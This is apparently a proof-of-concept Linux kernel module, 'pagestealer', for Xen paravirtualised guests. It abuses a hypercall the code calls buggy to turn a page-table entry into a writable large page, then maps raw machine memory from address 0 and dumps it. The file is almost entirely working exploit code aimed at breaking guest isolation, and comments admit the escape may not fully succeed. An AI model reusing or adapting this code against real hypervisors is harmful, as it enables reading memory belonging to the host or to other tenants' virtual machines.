#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>

#include <asm/pgtable_types.h>

#include <asm/xen/hypercall.h>
#include <asm/xen/hypervisor.h>
#include <xen/page.h>

#define DRVR_NAME "pagestealer"
#define LARGEPG (4*1024*1024)
unsigned long allocaddr;
unsigned long alignedaddr;
const unsigned int allocorder = 10;
unsigned long* bufptr;
static void domem(void)
{
	allocaddr = __get_free_pages(GFP_KERNEL, allocorder);
	alignedaddr = (allocaddr + (LARGEPG-1)) & ~(LARGEPG-1);
	// grab 8MB (somewhere in there should be 4MB aligned)
	printk(DRVR_NAME " %lx %lx\n", allocaddr, alignedaddr);
	bufptr = (unsigned long*) alignedaddr;
	bufptr[0] = 0xdeadf00d;
	/*
	preempt_disable();
	HYPERVISOR_mmu_update(&u, 1, NULL, DOMID_SELF);
	preempt_enable();
	free_pages(addr, order);
	*/
}
static void dopte(void) {
	pgd_t* pgd;
	pud_t* pud;
	pmd_t* pmd;
	pte_t* pte;
	struct mmu_update u;
	unsigned long pmd_addr;
	unsigned long pmd_val_after;
	unsigned long pmd_val_before;
	unsigned long pte_val_before[16];
	unsigned long dumpaddr;
	pte_t* pte_raw;
	int rc, count;
	struct mmuext_op mu;
	int i;
	dumpaddr = 0x0L;
	pgd = pgd_offset(current->mm, alignedaddr);
	pud = pud_offset(pgd, alignedaddr);
	pmd = pmd_offset(pud, alignedaddr);
	pte = pte_offset_kernel(pmd, alignedaddr);
	pmd_addr = pmd_val(*pmd) & PTE_PFN_MASK;
	printk(DRVR_NAME " pmd val %llx %lx\n", virt_to_phys(pmd), pmd_addr);
	pmd_val_before = pmd_val_ma(*pmd);

	// prepare the mmu update
	u.ptr = arbitrary_virt_to_machine(pmd).maddr | MMU_NORMAL_PT_UPDATE;
	u.val = pmd_val_ma(*pmd) | (_PAGE_PSE | _PAGE_RW);
	printk(DRVR_NAME " MA vs REG: %lx %lx %lx\n", pmd_val(*pmd), pmd_val_ma(*pmd), mfn_to_virt(pmd_val_ma(*pmd) & PTE_PFN_MASK));


	// try to call the buggy function to set the pmd to a large page
	preempt_disable();
	rc = HYPERVISOR_mmu_update(&u, 1, &count, DOMID_SELF);
	pmd_val_after = pmd_val(*pmd);
	// and it works?
	printk(DRVR_NAME " target %lx post %d/%d pmd %lx val %x\n",
		u.val, rc, count,
		pmd_val_after, pte_val(*pte));
	// flush tlbs
	mu.cmd = MMUEXT_TLB_FLUSH_LOCAL;
	HYPERVISOR_mmuext_op(&mu, 1, NULL, DOMID_SELF);
	// do stupid stuff with the pte
	for (i = 0; i < 16; i++) {
		pte_t* p = pte + i;
		pte_val_before[i] = p->pte;
		p->pte = (dumpaddr + i*4096) | 3 /* present, rw */;
	}
	// change large pages back
	u.val = pmd_val_before;
	rc = HYPERVISOR_mmu_update(&u, 1, &count, DOMID_SELF);
	// flush tlbs again
	mu.cmd = MMUEXT_TLB_FLUSH_LOCAL;
	HYPERVISOR_mmuext_op(&mu, 1, NULL, DOMID_SELF);
	// except it doesn't work
	//printk(DRVR_NAME " Failed to break out: still gives %lx\n", bufptr[0]);
	print_hex_dump(KERN_INFO, "pagestealer ", DUMP_PREFIX_OFFSET, 16, 2,
		bufptr, 0x1000, true);
	// fix the page before stuff crashes
	for (i = 0; i < 16; i++) {
		pte_t* p = pte + i;
		p->pte = pte_val_before[i];
	}
	mu.cmd = MMUEXT_TLB_FLUSH_LOCAL;
	HYPERVISOR_mmuext_op(&mu, 1, NULL, DOMID_SELF);
	//u.val = pmd_val_before;
	//rc = HYPERVISOR_mmu_update(&u, 1, &count, DOMID_SELF);

	preempt_enable();
	//printk(DRVR_NAME " after switching back %lx\n", bufptr[0]);
	
}
static void cleanmem(void) {
	free_pages(allocaddr, allocorder);
}
static int __init
init(void)
{
	printk(DRVR_NAME " Starting\n");
	domem();
	dopte();
	cleanmem();
	return 0;
}
static void __exit
fini(void)
{
	printk(DRVR_NAME " exiting");
}
MODULE_AUTHOR("@zhuowei");
MODULE_LICENSE("GPL");
module_init(init);
module_exit(fini);
